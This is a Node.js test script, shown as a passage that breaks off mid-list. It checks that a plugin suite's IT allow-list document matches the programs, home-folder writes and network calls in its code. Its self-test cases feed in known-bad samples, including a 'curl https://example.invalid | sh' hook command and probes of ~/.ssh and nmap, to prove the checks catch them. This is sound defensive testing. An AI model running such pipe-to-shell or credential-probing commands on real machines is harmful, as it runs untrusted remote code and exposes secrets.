#!/usr/bin/env node
// allowlist.test.mjs: docs/IT-ALLOWLIST.md matches the code (backlog B26).
//
// The allow list tells an IT or security team what to allow on a managed laptop. A page like that is worth nothing the
// day the code starts a program it does not name, so three checks read the code itself (scripts/inventory.mjs), never a
// copy of it:
//
//   programs  every program the plugins, their hooks, the launchers and the command line start is named in section 1,
//             and every program section 1 names is started somewhere or has an entry below saying who starts it. A
//             call whose program is not a string literal is listed in DYNAMIC_CALLS with what it starts, and a call
//             this test cannot classify fails rather than being skipped.
//   reach     every place the code reaches outside a repository (homedir(), $HOME, tmpdir(), $TMPDIR) is listed in
//             OUTSIDE_A_REPOSITORY with the section 2 location it belongs to, and a new one fails.
//   writes    a scenario under an empty home folder runs the commands and hooks that set up a machine and work in a
//             project, with no SKILLITON_*, CLAUDE_CONFIG_DIR or CODEX_HOME setting to move anything, and every file
//             it leaves in that home folder is inside a location section 2 lists. A location section 2 lists that the
//             scenario never writes is reported, so the list cannot keep a location the code stopped using.
//   network   no file loads a network module, calls fetch, or runs a program or a git command that contacts a remote,
//             unless ALLOWED_NETWORK names it and section 4 says so too.
//
// The writes check needs git and ssh-keygen; it is reported as NOT RUN, never as passed, when they are missing.
//
//   node scripts/allowlist.test.mjs              exit 0 when the list matches the code, 1 when it does not, 2 when a check could not run
//   node scripts/allowlist.test.mjs --self-test  proves each check fails on known-bad input

import { execFileSync, spawnSync } from "node:child_process";
import { chmodSync, cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, relative } from "node:path";
import {
  ALLOWLIST_DOC, REPO, SHELL_BUILTINS, allowlistMachineLocations, allowlistPrograms, jsProgramCalls, locationMatches,
  networkUses, scopeFiles, section, shellCommands,
} from "./inventory.mjs";
import { PROGRAMS } from "../packs/base/plugins/workflow/runtime/lib/preflight.mjs";

const PLUGIN = "packs/base/plugins";
const WORKFLOW = `${PLUGIN}/workflow`;

// Functions that run the program their caller names, so their call sites are read the same way.
const WRAPPERS = ["runProgram", "runClient"];

// Every call whose program is not a string literal: what it starts, and how that is known. `count` is how many such
// call sites the file has, so a new one fails this test instead of passing under an existing entry.
export const DYNAMIC_CALLS = [
  { file: `${WORKFLOW}/runtime/lib/core.mjs`, callee: "spawnSync", arg: "file", count: 1, programs: [], why: "inside runProgram, the wrapper; every caller of it is read below" },
  { file: `${WORKFLOW}/runtime/lib/join.mjs`, callee: "spawnSync", arg: "binary.path", count: 1, programs: [], why: "inside runClient, the wrapper; every caller of it is read below" },
  { file: `${WORKFLOW}/runtime/lib/core.mjs`, callee: "runProgram", arg: "bin", count: 1, programs: ["claude"], why: "doctor asks a Claude Code copy bundled in an editor extension for its version" },
  { file: `${WORKFLOW}/runtime/lib/core.mjs`, callee: "runProgram", arg: "cli.path", count: 2, programs: ["claude"], why: "doctor runs claude plugin list and marketplace list" },
  { file: `${WORKFLOW}/runtime/lib/core.mjs`, callee: "runProgram", arg: "path", count: 1, programs: ["claude"], why: "doctor asks the claude on PATH for its version" },
  { file: `${WORKFLOW}/runtime/lib/join.mjs`, callee: "runClient", arg: "c.binary", count: 4, programs: ["claude", "codex"], why: "join and join --undo run each client's own marketplace and plugin commands" },
  { file: `${WORKFLOW}/runtime/lib/collectors.mjs`, callee: "spawn", arg: "check.command[0]", count: 1, programs: [], policy: true, why: "a command from the project's own delivery policy, collecting test evidence" },
  { file: `${WORKFLOW}/runtime/lib/delivery.mjs`, callee: "spawn", arg: "check.command[0]", count: 1, programs: [], policy: true, why: "a command from the shared repository's delivery policy, run by the gate" },
  { file: `${WORKFLOW}/runtime/lib/delivery.mjs`, callee: "runProgram", arg: "runtimePath", count: 1, programs: ["bash", "node"], why: "delivery install probes the workflow plugin's bin/skilliton launcher, a bash script that runs node" },
  { file: `${WORKFLOW}/runtime/lib/preflight.mjs`, callee: "spawnSync", arg: "probe", count: 1, programs: ["env", "bash"], why: "preflight runs the plugin's own probe script by its path, so its first line starts env and bash, the way Claude Code runs a hook" },
  { file: `${WORKFLOW}/runtime/lib/preflight.mjs`, callee: "spawnSync", arg: "path", count: 1, programs: [], table: "PROGRAMS", why: "preflight starts each program from the PROGRAMS table in the same file once, with --version; the table is checked against section 1 below" },
];

// Commands in a shell script whose program is an expansion: what they run, and how many such commands the file has.
export const SHELL_DYNAMIC = [
  { file: `${WORKFLOW}/runtime/preflight/probe.sh`, text: '"$path"', count: 2, why: "the program the preflight check asked about, found with command -v; the names come from the PROGRAMS table in runtime/lib/preflight.mjs" },
];

// Programs the allow list names that Skilliton does not start itself, with what does.
export const STARTED_BY_OTHERS = [
  ["ssh-keygen", "git starts it to make and check SSH signatures (gpg.format=ssh), in verify, join and release"],
  ["/bin/sh", "Claude Code runs each hook command through a shell (sh -c on macOS and Linux), and the launcher join writes begins with #!/bin/sh"],
  ["sh", "the same shell, named without its path"],
];

// Where the code reaches outside a repository, and the section 2 location each belongs to. The text is matched
// against the file, so changing one of these lines brings someone back to this list and to the allow list.
export const OUTSIDE_A_REPOSITORY = [
  [`${WORKFLOW}/runtime/lib/core.mjs`, "const HOME = homedir();", "the backups folder ~/.claude/backups/skilliton/ and short paths in messages"],
  [`${WORKFLOW}/runtime/lib/join.mjs`, 'process.env.SKILLITON_JOIN_DIR || join(homedir(), ".config", "skilliton", "joined")', "~/.config/skilliton/joined/<company>.json"],
  [`${WORKFLOW}/runtime/lib/join.mjs`, 'binDir ?? join(homedir(), ".local", "bin")', "~/.local/bin/skilliton"],
  [`${WORKFLOW}/runtime/lib/trust.mjs`, 'process.env.SKILLITON_TRUST_DIR || join(homedir(), ".config", "skilliton", "trust")', "~/.config/skilliton/trust/<company>.allowed_signers"],
  [`${WORKFLOW}/runtime/lib/verify.mjs`, 'process.env.CLAUDE_CONFIG_DIR || join(homedir(), ".claude")', "Claude Code's own folder, read, and written by its own commands"],
  [`${WORKFLOW}/runtime/lib/verify.mjs`, 'process.env.CODEX_HOME || join(homedir(), ".codex")', "Codex's own folder, read, and created by join when it is missing"],
  [`${WORKFLOW}/runtime/lib/legacy-names.mjs`, 'join(homedir(), ".config", OLD)', "the folder used before the rename, named in messages and never written"],
  [`${WORKFLOW}/runtime/lib/delivery.mjs`, 'mkdtempSync(join(tmpdir(), "skilliton-delivery-"))', "$TMPDIR/skilliton-delivery-*, removed when the gate finishes"],
  [`${WORKFLOW}/runtime/commands/propose.mjs`, 'mkdtempSync(join(tmpdir(), "skilliton-propose-"))', "$TMPDIR/skilliton-propose-*, removed when propose finishes"],
  [`${WORKFLOW}/runtime/lib/preflight.mjs`, 'resolve(binDir ?? join(homedir(), ".local", "bin"))', "~/.local/bin, tested with a file the check removes again"],
  [`${WORKFLOW}/runtime/lib/preflight.mjs`, "{ path: tmpdir(), what:", "the temporary folder, tested the same way"],
  [`${PLUGIN}/context-hygiene/hooks/statusline-quota.sh`, 'LOG="${SKILLITON_USAGE_LOG:-$HOME/.claude/skilliton/usage-log.jsonl}"', "~/.claude/skilliton/usage-log.jsonl"],
  [`${PLUGIN}/context-hygiene/hooks/statusline-quota.sh`, 'KEYS_LOG="${SKILLITON_KEYS_LOG:-$HOME/.claude/skilliton/statusline-keys-seen.log}"', "~/.claude/skilliton/statusline-keys-seen.log"],
  [`${PLUGIN}/context-hygiene/hooks/config-drift-check.sh`, 'SETTINGS="${SKILLITON_SETTINGS:-$HOME/.claude/settings.json}"', "Claude Code's settings, read only"],
  [`${PLUGIN}/context-hygiene/hooks/config-drift-check.sh`, 'PROJECTS="${SKILLITON_PROJECTS:-$HOME/.claude/projects}"', "Claude Code's transcripts, read only"],
  [`${PLUGIN}/guardrails/hooks/guard-bash.sh`, "'~') RESOLVED=${HOME:-} ;;", "reads HOME to work out which folder a command would run in"],
  [`${PLUGIN}/guardrails/hooks/guard-bash.sh`, `'~/'*) if [ -n "\${HOME:-}" ]; then RESOLVED="$HOME/\${a#'~/'}"; else RESOLVED=""; fi ;;`, "the same"],
  [`${PLUGIN}/guardrails/hooks/guard-bash.sh`, 'if [ "$k" -ge "$n" ]; then EFF_DIR=${HOME:-}; return 0; fi', "the same, for a bare cd"],
  ["scripts/setup.mjs", "const HOME = homedir();", "~/.claude/settings.json and ~/.claude/backups/skilliton/, for the optional status line"],
  ["scripts/scrub-check.sh", 'DENY="${SKILLITON_DENYLIST:-$HOME/.config/skilliton/denylist}"', "the private denylist, read only"],
  ["scripts/scrub-check.sh", 'LEGACY_DENY="$HOME/.config/', "the denylist location used before the rename, named and never read"],
  ["scripts/scrub-check.sh", 'hits=$(printf \'%s\\n\' "$files" | tr \'\\n\' \'\\0\' | xargs -0 grep -H -I -n -E "$HOMEPATH" 2>/dev/null)', "a pattern for home paths in files, not a folder"],
  ["scripts/scrub-check.sh", 'n=$(printf \'%s\\n\' "$log" | grep -c -E "$HOMEPATH")', "the same pattern"],
];
const OUTSIDE_RE = /homedir\(\)|process\.env\.HOME|tmpdir\(\)|\$\{?HOME\}?|\$\{?TMPDIR/;

// Network use the allow list permits. Each entry must also be named in section 4; with none, section 4 says the code
// makes no requests of its own, and this test holds it to that.
export const ALLOWED_NETWORK = [
  { file: `${WORKFLOW}/runtime/lib/preflight.mjs`, text: '"ls-remote"', docPhrase: "git ls-remote --heads https://github.com/<owner>/<repo>", why: "the preflight check asks whether this machine can reach the company's plugin repository" },
];

const GIT_WRAPPERS = { [`${PLUGIN}/guardrails/hooks/guard-bash.sh`]: ["g"] };

const read = (path) => readFileSync(join(REPO, path), "utf8");
const sorted = (set) => [...set].sort();

// ---------- programs ----------

// Every program the code starts: Map(program -> [where it is started]). Anything that cannot be classified is a
// problem, never a silent skip.
export function programsFromCode(files = scopeFiles(), readFile = read, shellDynamic = SHELL_DYNAMIC.map((e) => ({ ...e }))) {
  const found = new Map();
  const problems = [];
  const add = (program, where) => { if (!found.has(program)) found.set(program, []); found.get(program).push(where); };

  for (const path of files.shell) {
    const text = readFile(path);
    const { commands, dynamic, functions, problems: shellProblems } = shellCommands(text);
    for (const p of shellProblems) problems.push(`${path}:${p.line}: ${p.text}`);
    for (const d of dynamic) {
      const entry = shellDynamic.find((e) => e.file === path && e.text === d.text);
      if (entry) { entry.seen = (entry.seen ?? 0) + 1; continue; }
      problems.push(`${path}:${d.line}: the command ${d.text} is an expansion, so the program it starts cannot be read; add it to SHELL_DYNAMIC in scripts/allowlist.test.mjs with what it runs`);
    }
    for (const c of commands) {
      if (SHELL_BUILTINS.has(c.word) || functions.includes(c.word)) continue;
      add(c.word, `${path}:${c.line}`);
      if (c.word.includes("/")) add(c.word.split("/").pop(), `${path}:${c.line}`);
    }
    const shebang = /^#!\s*(\S+)(?:\s+(\S+))?/.exec(text);
    if (shebang) {
      add(shebang[1], `${path}:1 (the first line)`);
      add(shebang[1].split("/").pop(), `${path}:1 (the first line)`);
      if (shebang[2]) add(shebang[2], `${path}:1 (the first line)`);
    }
  }

  const expected = new Map(DYNAMIC_CALLS.map((d) => [`${d.file} ${d.callee}(${d.arg})`, { ...d, seen: 0 }]));
  for (const path of files.js) {
    const { calls, problems: jsProblems } = jsProgramCalls(readFile(path), WRAPPERS);
    for (const p of jsProblems) problems.push(`${path}:${p.line}: ${p.text}`);
    for (const call of calls) {
      if (call.program) { add(call.program, `${path}:${call.line}`); continue; }
      const key = `${path} ${call.callee}(${call.arg})`;
      const entry = expected.get(key);
      if (!entry) {
        problems.push(`${path}:${call.line}: ${call.callee}(${call.arg}) does not say which program it starts; add it to DYNAMIC_CALLS in scripts/allowlist.test.mjs with what it runs, and to ${ALLOWLIST_DOC}`);
        continue;
      }
      entry.seen++;
      for (const program of entry.programs) add(program, `${path}:${call.line} (${entry.why})`);
    }
  }
  for (const [key, entry] of expected) {
    if (entry.seen !== entry.count) problems.push(`DYNAMIC_CALLS in scripts/allowlist.test.mjs expects ${entry.count} call(s) of ${key}, but the code has ${entry.seen}; check what changed and update both this list and ${ALLOWLIST_DOC}`);
  }
  for (const entry of shellDynamic) {
    if ((entry.seen ?? 0) !== entry.count) problems.push(`SHELL_DYNAMIC in scripts/allowlist.test.mjs expects ${entry.count} command(s) written ${entry.text} in ${entry.file}, but the file has ${entry.seen ?? 0}; check what changed`);
  }
  return { found, problems, policy: DYNAMIC_CALLS.some((d) => d.policy) };
}

// The hook commands each plugin registers. Claude Code passes them to a shell, which runs a script inside the plugin,
// so each one must name a file this test already read.
export function hookCommands(files = scopeFiles(), readFile = read, listHooks = defaultHookFiles) {
  const problems = [];
  const shells = [];
  for (const path of listHooks()) {
    let hooks;
    try { hooks = JSON.parse(readFile(path)); } catch (e) { problems.push(`${path}: ${e.message}`); continue; }
    const commands = Object.values(hooks.hooks ?? {}).flat().flatMap((entry) => (entry.hooks ?? []).map((h) => h.command));
    for (const command of commands) {
      const m = /^"\$\{CLAUDE_PLUGIN_ROOT\}"\/((?:hooks|bin)\/[A-Za-z0-9._-]+)(?: [a-z-]+)*$/.exec(command ?? "");
      if (!m) { problems.push(`${path}: the hook command ${JSON.stringify(command)} is not "\${CLAUDE_PLUGIN_ROOT}"/hooks/<script> or /bin/<script>; read what it starts and update ${ALLOWLIST_DOC}`); continue; }
      const script = `${dirname(dirname(path))}/${m[1]}`;
      if (!files.shell.includes(script)) problems.push(`${path}: the hook command runs ${script}, which this test does not read; add it to the files in scripts/inventory.mjs`);
      shells.push(`${path} (${m[1]})`);
    }
  }
  return { shells, problems };
}

function defaultHookFiles() {
  return readdirSync(join(REPO, PLUGIN)).sort().map((plugin) => `${PLUGIN}/${plugin}/hooks/hooks.json`).filter((p) => existsSync(join(REPO, p)));
}

// Compares the programs found in the code with section 1 of the allow list.
export function checkPrograms(found, doc) {
  const violations = [];
  const list = allowlistPrograms(doc);
  if (!list) return ["the allow list has no section that starts with \"## 1. Programs\""];
  for (const [program, where] of found) {
    if (list.programs.has(program)) continue;
    if (program.includes("/") && list.programs.has(program.split("/").pop())) continue;
    violations.push(`the code starts ${program} (${where[0]}${where.length > 1 ? `, and ${where.length - 1} more` : ""}), which section 1 of ${ALLOWLIST_DOC} does not name`);
  }
  const named = new Set(STARTED_BY_OTHERS.map(([p]) => p));
  for (const [program] of list.programs) {
    if (found.has(program) || named.has(program)) continue;
    violations.push(`section 1 of ${ALLOWLIST_DOC} names ${program}, but nothing in the code starts it; remove the row, or add it to STARTED_BY_OTHERS in scripts/allowlist.test.mjs with what does`);
  }
  for (const [program, why] of STARTED_BY_OTHERS) {
    if (!list.programs.has(program)) violations.push(`STARTED_BY_OTHERS in scripts/allowlist.test.mjs says ${program} is started by ${why}, but section 1 of ${ALLOWLIST_DOC} does not name it`);
  }
  return violations;
}

// The preflight check carries the same list of programs in code, so a laptop can be checked against it. The two must
// say the same thing, or one of them is wrong for whoever reads it.
export function checkPreflightTable(doc, programs = PROGRAMS) {
  const violations = [];
  const list = allowlistPrograms(doc);
  if (!list) return ["the allow list has no section that starts with \"## 1. Programs\""];
  for (const p of programs) {
    if (!list.programs.has(p.name)) violations.push(`the PROGRAMS table in runtime/lib/preflight.mjs checks for ${p.name}, which section 1 of ${ALLOWLIST_DOC} does not name`);
  }
  const checked = new Set(programs.map((p) => p.name));
  for (const [program] of list.programs) {
    const name = program.split("/").pop();
    if (checked.has(name)) continue;
    violations.push(`section 1 of ${ALLOWLIST_DOC} names ${program}, which the PROGRAMS table in runtime/lib/preflight.mjs does not check for; a laptop would never be told it is missing`);
  }
  return violations;
}

// ---------- where the code reaches outside a repository ----------

export function checkOutsideReach(files = scopeFiles(), readFile = read, listed = OUTSIDE_A_REPOSITORY) {
  const violations = [];
  const remaining = listed.map(([file, text, what]) => ({ file, text, what, seen: 0 }));
  for (const path of [...files.js, ...files.shell]) {
    readFile(path).split("\n").forEach((line, i) => {
      if (!OUTSIDE_RE.test(line)) return;
      const entry = remaining.find((e) => e.file === path && line.includes(e.text));
      if (entry) { entry.seen++; return; }
      violations.push(`${path}:${i + 1} reaches outside a repository (${line.trim().slice(0, 120)}), which OUTSIDE_A_REPOSITORY in scripts/allowlist.test.mjs does not list; add it with the section 2 location it writes, and update ${ALLOWLIST_DOC}`);
    });
  }
  for (const e of remaining) {
    if (!e.seen) violations.push(`OUTSIDE_A_REPOSITORY in scripts/allowlist.test.mjs lists ${e.file} (${e.what}), but that line is no longer there; check what replaced it`);
  }
  return violations;
}

// ---------- network ----------

export function checkNetwork(files = scopeFiles(), readFile = read, doc = read(ALLOWLIST_DOC), allowed = ALLOWED_NETWORK) {
  const violations = [];
  for (const hit of networkUses(files, readFile, GIT_WRAPPERS)) {
    const entry = allowed.find((a) => a.file === hit.path && hit.text.includes(a.text));
    if (!entry) { violations.push(`${hit.path}:${hit.line} uses ${hit.what} (${hit.text}), which section 4 of ${ALLOWLIST_DOC} says the code does not do; either take it out, or add it to ALLOWED_NETWORK in scripts/allowlist.test.mjs and say so in section 4`); continue; }
    if (!doc.includes(entry.docPhrase)) violations.push(`ALLOWED_NETWORK in scripts/allowlist.test.mjs allows ${entry.text} in ${entry.file}, but ${ALLOWLIST_DOC} does not say "${entry.docPhrase}"`);
  }
  const s4 = section(doc, "## 4. Network") ?? "";
  if (!allowed.length && !/none of its own/.test(s4)) violations.push(`nothing in the code contacts a network, but section 4 of ${ALLOWLIST_DOC} no longer says "none of its own"`);
  return violations;
}

// ---------- writes on the machine ----------

// Every path the scenario left in the home folder, compared with the locations section 2 lists.
export function checkWrites(written, locations) {
  const violations = [];
  const used = new Set();
  for (const path of written) {
    const location = locations.find((l) => locationMatches(l, path));
    if (location) { used.add(location); continue; }
    if (locations.some((l) => l.slice(2).startsWith(`${path}/`))) continue; // a folder on the way to a listed location
    violations.push(`the scenario left ~/${path} in the home folder, which section 2 of ${ALLOWLIST_DOC} does not list`);
  }
  for (const location of locations) {
    if (!used.has(location)) violations.push(`section 2 of ${ALLOWLIST_DOC} lists ${location}, but the scenario wrote nothing there; check whether the code still writes it, and remove the row or add the step that writes it`);
  }
  return violations;
}

const GIT_ENV = { GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1", GIT_AUTHOR_NAME: "Skilliton Test", GIT_AUTHOR_EMAIL: "test@example.invalid", GIT_COMMITTER_NAME: "Skilliton Test", GIT_COMMITTER_EMAIL: "test@example.invalid" };
const MARKET = "acme-skills";

function toolPath(name) {
  const r = spawnSync("sh", ["-c", `command -v ${name}`], { encoding: "utf8" });
  return r.status === 0 ? r.stdout.trim() : null;
}

// Runs the machine-level commands and the hooks under an empty home folder and returns every path they left there,
// relative to it, plus what ran. Returns { notRun } when a program the scenario needs is missing.
export function measureWrites() {
  const git = toolPath("git"), keygen = toolPath("ssh-keygen");
  if (!git || !keygen) return { notRun: `${git ? "ssh-keygen" : "git"} was not found on PATH, and the writes check needs it` };
  const base = realpathSync(mkdtempSync(join(tmpdir(), "skilliton-allowlist-")));
  try {
    const ws = {
      home: join(base, "home"), tmp: join(base, "tmp"), tools: join(base, "tools"), keys: join(base, "keys"),
      repo: join(base, "company-skills"), project: join(base, "project"), log: join(base, "clients.log"),
    };
    for (const d of [ws.home, ws.tmp, ws.tools, ws.keys]) mkdirSync(d, { recursive: true });
    for (const [name, target] of Object.entries({ node: process.execPath, git, "ssh-keygen": keygen })) symlinkSync(target, join(ws.tools, name));
    for (const client of ["claude", "codex"]) {
      writeFileSync(join(ws.tools, client), `#!/bin/sh\nexec node ${JSON.stringify(join(REPO, "scripts", "fixtures", "clients", "standin.mjs"))} ${client} "$@"\n`);
      chmodSync(join(ws.tools, client), 0o755);
    }

    // A company skills repository clone, the way join expects to be run from one.
    for (const plugin of readdirSync(join(REPO, PLUGIN))) cpSync(join(REPO, PLUGIN, plugin), join(ws.repo, PLUGIN, plugin), { recursive: true });
    mkdirSync(join(ws.repo, "scripts"), { recursive: true });
    for (const f of ["skilliton.mjs", "setup.mjs", "scrub-check.sh"]) cpSync(join(REPO, "scripts", f), join(ws.repo, "scripts", f));
    const plugins = readdirSync(join(ws.repo, PLUGIN)).sort();
    writeJson(join(ws.repo, ".claude-plugin", "marketplace.json"), {
      name: MARKET, owner: { name: "acme" },
      plugins: plugins.map((name) => ({ name, source: `./${PLUGIN}/${name}`, description: name, license: "MIT" })),
    });
    writeJson(join(ws.repo, "templates", "project-settings.json"), {
      extraKnownMarketplaces: { [MARKET]: { source: { source: "github", repo: "acme/skills" }, autoUpdate: true } },
      enabledPlugins: Object.fromEntries(plugins.map((name) => [`${name}@${MARKET}`, true])),
    });

    const env = {
      ...GIT_ENV, PATH: `${ws.tools}:${process.env.PATH ?? ""}`, HOME: ws.home, TMPDIR: ws.tmp, LANG: "C.UTF-8",
      SKILLITON_SELF: "skilliton", STANDIN_LOG: ws.log, STANDIN_DEFAULT_HOME: "1",
    };
    const run = (file, args, options = {}) => spawnSync(file, args, { encoding: "utf8", env: { ...env, ...options.env }, cwd: options.cwd ?? base, input: options.input, timeout: 120000 });
    const cli = (args, options) => run(process.execPath, [join(ws.repo, "scripts", "skilliton.mjs"), ...args], options);
    const gitIn = (dir, ...args) => execFileSync(git, ["-C", dir, ...args], { env, encoding: "utf8" });

    for (const dir of [ws.repo, ws.project]) {
      mkdirSync(dir, { recursive: true });
      writeFileSync(join(dir, "README.md"), "# a repository\n");
      gitIn(dir, "init", "-q", "-b", "main");
      gitIn(dir, "add", "-A");
      gitIn(dir, "commit", "-q", "-m", "first");
    }
    execFileSync(keygen, ["-q", "-t", "ed25519", "-N", "", "-C", "approver@example.invalid", "-f", join(ws.keys, "approver")], { env });
    const pub = readFileSync(join(ws.keys, "approver.pub"), "utf8").trim().split(/\s+/).slice(0, 2).join(" ");
    writeFileSync(join(ws.keys, "allowed_signers"), `approver@example.invalid namespaces="git" ${pub}\n`);

    const hook = (name, input) => run(join(ws.repo, PLUGIN, "workflow", "bin", "skilliton"), ["hook", name], { cwd: ws.project, input, env: { CLAUDE_PROJECT_DIR: ws.project } });
    const script = (plugin, name, input, extra = {}) => run("bash", [join(ws.repo, PLUGIN, plugin, "hooks", name)], { cwd: ws.project, input, env: { CLAUDE_PROJECT_DIR: ws.project, ...extra } });
    const sessionInput = JSON.stringify({ session_id: "s1", cwd: ws.project, hook_event_name: "SessionStart" });
    const steps = [
      ["join --apply", () => cli(["join", "--company", "acme", "--signers", join(ws.keys, "allowed_signers"), "--marketplace", ws.repo, "--apply"])],
      ["verify", () => cli(["verify", "--company", "acme"])],
      ["doctor", () => cli(["doctor", "--dir", ws.project])],
      ["status line setup --apply", () => run(process.execPath, [join(ws.repo, "scripts", "setup.mjs"), "--apply"])],
      ["the status line", () => run("bash", [join(ws.repo, PLUGIN, "context-hygiene", "hooks", "statusline-quota.sh")], { input: JSON.stringify({ model: { display_name: "test" }, context_window: { used_percentage: 1 }, cost: { total_cost_usd: 0 } }) })],
      ["preflight", () => cli(["preflight", "--no-network", "--repo", ws.repo])],
      ["prepare --apply", () => cli(["prepare", "--dir", ws.project, "--apply"])],
      ["task start --apply", () => cli(["task", "start", "a task", "--dir", ws.project, "--apply"])],
      ["checkpoint --apply", () => cli(["checkpoint", "--state", "s", "--evidence", "e", "--next", "n", "--dir", ws.project, "--apply"])],
      ["the session-start hook", () => hook("session-start", sessionInput)],
      ["the stop hook", () => hook("stop", JSON.stringify({ session_id: "s1", cwd: ws.project, hook_event_name: "Stop" }))],
      ["the pre-compact hook", () => hook("pre-compact", JSON.stringify({ session_id: "s1", cwd: ws.project, hook_event_name: "PreCompact" }))],
      ["the session-end hook", () => hook("session-end", JSON.stringify({ session_id: "s1", cwd: ws.project, hook_event_name: "SessionEnd" }))],
      ["the handoff hook", () => script("workflow", "session-start-handoff.sh", sessionInput)],
      ["the guardrails session hook", () => script("guardrails", "session-start-guardrails.sh", sessionInput)],
      ["the guardrails command hook", () => script("guardrails", "guard-bash.sh", JSON.stringify({ session_id: "s1", cwd: ws.project, hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: "git commit -m test" } }))],
      ["the checklist hook", () => script("context-hygiene", "session-start-checklist.sh", sessionInput, { SKILLITON_LESSONS: join(ws.project, "README.md") })],
      ["the status line setup --undo", () => run(process.execPath, [join(ws.repo, "scripts", "setup.mjs"), "--undo"])],
      ["join --undo --apply", () => cli(["join", "--undo", "--company", "acme", "--apply"])],
    ];
    // Snapshots are taken after every step and added up, because a later step (join --undo) removes what an earlier
    // one wrote, and this check is about every place the machine was written, not what is left at the end.
    const ran = [];
    const written = new Set();
    for (const [label, step] of steps) {
      const r = step();
      if (r.error) return { notRun: `the step "${label}" could not run: ${r.error.message}` };
      ran.push({ label, exit: r.status, output: `${r.stdout ?? ""}${r.stderr ?? ""}`.trim() });
      for (const path of walkRelative(ws.home)) written.add(path);
    }
    return { written: [...written].sort(), leftInTemp: walkRelative(ws.tmp), steps: ran };
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
}

function writeJson(path, value) {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, `${JSON.stringify(value, null, 2)}\n`);
}

// Every file and folder under dir, as paths relative to it with forward slashes.
function walkRelative(dir, out = [], root = dir) {
  for (const name of readdirSync(dir).sort()) {
    const path = join(dir, name);
    out.push(relative(root, path).split("\\").join("/"));
    if (statSync(path).isDirectory()) walkRelative(path, out, root);
  }
  return out;
}

// ---------- running ----------

function main() {
  const doc = read(ALLOWLIST_DOC);
  const files = scopeFiles();
  let failed = 0, notRun = 0;
  const report = (name, violations) => {
    for (const v of violations) console.log(`FAIL ${name}: ${v}`);
    console.log(violations.length ? `${name}: ${violations.length} problem(s)` : `ok   ${name}`);
    if (violations.length) failed += violations.length;
  };

  const { found, problems } = programsFromCode(files);
  const hooks = hookCommands(files);
  report("programs the code starts are read", [...problems, ...hooks.problems]);
  report("section 1 names every program the code starts", problems.length ? [] : checkPrograms(found, doc));
  report("the preflight check looks for every program section 1 names", checkPreflightTable(doc));
  report("section 2 covers every place the code reaches outside a repository", checkOutsideReach(files));
  report("section 4 matches the code's network use", checkNetwork(files, read, doc));

  const locations = allowlistMachineLocations(doc);
  if (!locations?.length) report("section 2 lists locations on the machine", ["section 2 of the allow list has no table of locations in the home folder"]);
  else {
    const measured = measureWrites();
    if (measured.notRun) { console.log(`NOT RUN writes in an empty home folder: ${measured.notRun}`); notRun++; }
    else {
      const failedSteps = measured.steps.filter((s) => s.exit !== 0 && s.exit !== 1);
      for (const s of failedSteps) console.log(`     the step "${s.label}" exited ${s.exit}: ${s.output.split("\n").slice(-2).join(" ").slice(0, 200)}`);
      const leftovers = measured.leftInTemp.length ? [`the scenario left ${measured.leftInTemp.length} path(s) in the temporary folder (${measured.leftInTemp.slice(0, 3).join(", ")}); every temporary file is meant to be removed`] : [];
      const stepProblems = failedSteps.map((s) => `the step "${s.label}" exited ${s.exit}, so what it would have written was not measured`);
      report(`writes in an empty home folder (${measured.steps.length} steps, ${measured.written.length} paths)`, [...stepProblems, ...checkWrites(measured.written, locations), ...leftovers]);
    }
  }

  console.log(failed ? `\nallow list check FAILED: ${failed} problem(s); ${ALLOWLIST_DOC} and the code disagree` : notRun ? `\nallow list check: every check that ran passed, ${notRun} NOT RUN` : `\nallow list check passed: ${ALLOWLIST_DOC} matches the code (${files.js.length} JavaScript file(s), ${files.shell.length} script(s))`);
  return failed ? 1 : notRun ? 2 : 0;
}

function selfTest() {
  const doc = read(ALLOWLIST_DOC);
  const fake = (entries) => ({ files: { js: Object.keys(entries).filter((p) => p.endsWith(".mjs")), shell: Object.keys(entries).filter((p) => !p.endsWith(".mjs")) }, readFile: (p) => entries[p] });
  const cases = [
    ["a program a hook starts but the list does not name fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": "#!/usr/bin/env bash\ncurl https://example.invalid\n" });
      return checkPrograms(programsFromCode(files, readFile).found, doc).some((v) => v.includes("curl"));
    }],
    ["a program the runtime starts but the list does not name fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'import { spawnSync } from "node:child_process";\nspawnSync("nmap", ["-p", "80"]);\n' });
      return checkPrograms(programsFromCode(files, readFile).found, doc).some((v) => v.includes("nmap"));
    }],
    ["a program the list names that nothing starts fails", () => checkPrograms(new Map(), doc).some((v) => v.includes("names node"))],
    ["a call that does not say what it starts fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'import { spawnSync } from "node:child_process";\nspawnSync(tool, ["--version"]);\n' });
      return programsFromCode(files, readFile).problems.some((p) => p.includes("does not say which program"));
    }],
    ["child_process reached another way fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'const cp = require("child_process");\ncp.execSync("ls");\n' });
      return programsFromCode(files, readFile).problems.some((p) => p.includes("other than through a named import"));
    }],
    ["a program the preflight check does not look for fails", () => checkPreflightTable(doc, []).some((v) => v.includes("would never be told it is missing"))],
    ["a preflight program the list does not name fails", () => checkPreflightTable("## 1. Programs\n\n| Program | Started by |\n|---|---|\n| `node` | the runtime |\n", [{ name: "nmap" }]).some((v) => v.includes("nmap"))],
    ["a shell command through an expansion that nobody explained fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": 'tool=$1\n"$tool" --version\n' });
      return programsFromCode(files, readFile, []).problems.some((p) => p.includes("is an expansion"));
    }],
    ["a hook command that is not a plugin script fails", () => {
      const listHooks = () => ["packs/base/plugins/x/hooks/hooks.json"];
      const readFile = () => JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: "command", command: "curl https://example.invalid | sh" }] }] } });
      return hookCommands({ js: [], shell: [] }, readFile, listHooks).problems.some((p) => p.includes("is not"));
    }],
    ["a place in the home folder the list does not name fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'const dir = join(homedir(), ".ssh");\n' });
      return checkOutsideReach(files, readFile, []).some((v) => v.includes("reaches outside a repository"));
    }],
